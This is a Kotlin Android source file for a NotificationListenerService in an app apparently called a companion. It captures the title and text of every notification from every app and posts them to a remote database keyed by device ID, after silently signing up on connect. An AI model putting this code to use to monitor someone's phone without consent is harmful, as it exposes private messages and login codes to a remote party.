// language: Kotlin, target: Android 7.0+ (API 24), file: NotifService.kt
// NotificationListenerService — streams all incoming notifications to /notifs
package com.kai.ccpanion

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import org.json.JSONObject

class NotifService : NotificationListenerService() {

    override fun onListenerConnected() {
        Rt.init(this)
        if (Rt.token() == null) exec { Rt.signUp(this) }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        try {
            val n = sbn.notification ?: return
            val extras = n.extras
            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
            val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
            val big = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: ""
            if (title.isBlank() && text.isBlank()) return

            val payload = JSONObject()
                .put("pkg", sbn.packageName)
                .put("title", title)
                .put("text", text)
                .put("big", big)
                .put("when", sbn.postTime)
            Rt.postDb("phones/${Rt.deviceId}/notifs", payload)
        } catch (e: Exception){ }
    }

    private fun exec(f: () -> Unit){ Thread { runCatching { f() } }.start() }
}
